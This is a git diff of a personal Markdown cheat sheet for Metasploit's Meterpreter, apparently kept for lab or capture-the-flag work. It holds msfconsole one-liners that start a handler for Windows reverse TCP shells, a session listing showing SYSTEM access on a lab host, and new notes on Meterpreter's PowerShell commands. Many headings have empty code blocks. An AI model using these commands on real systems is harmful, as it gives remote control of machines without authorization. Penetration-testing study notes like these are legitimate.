@@ -1,5 +1,7 @@
 # meterpreter
 
+- [Offensive PowerShell with Metasploit Meterpreter](#offensive-powershell-with-metasploit-meterpreter)
+
 ### TL;DR
 ```sh
 sysinfo
@@ -12,8 +14,8 @@ ps <string-to-search>
 ps -S <string-to-search>
 sessions
 ```
-### 
-```
+## 
+```sh
 
 ```
 
@@ -27,8 +29,8 @@ msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/rev
 msfconsole -x "use exploit/multi/handler;set payload windows/x64/powershell_reverse_tcp;set LHOST tun0; set LPORT 444;run;"
 ```
 
-### 
-```
+## 
+```sh
 
 ```
 
@@ -153,12 +155,47 @@ Active sessions
   2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DEVEL  10.10.16.52:1234 -> 10.10.10.5:49453 (10.10.10.5)
 ```
 
-### 
+# [Offensive PowerShell with Metasploit Meterpreter](https://www.sans.org/blog/offensive-powershell-metasploit-meterpreter/)
+
+## load the PowerShell extension
+```sh
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter >
 ```
+
+## Now we have access to 4 PowerShell-related commands
+`powershell_execute`: Execute a PowerShell statement, including complex-statements separated by semicolons
+`powershell_import`: Import a local PowerShell script to execute on the remote system over the Meterpreter channel
+`powershell_shell`: Launch an interactive PowerShell shell
+`powershell_session_remove`: Used to remove a PowerShell session when created using execute/import/shell with the -s argument
+
+## 
+```sh
 
 ```
 
-### 
+## 
+```sh
+
 ```
+
+## 
+```sh
+
+```
+
+## 
+```sh
+
+```
+
+## 
+```sh
+
+```
+
+## 
+```sh
 
 ```
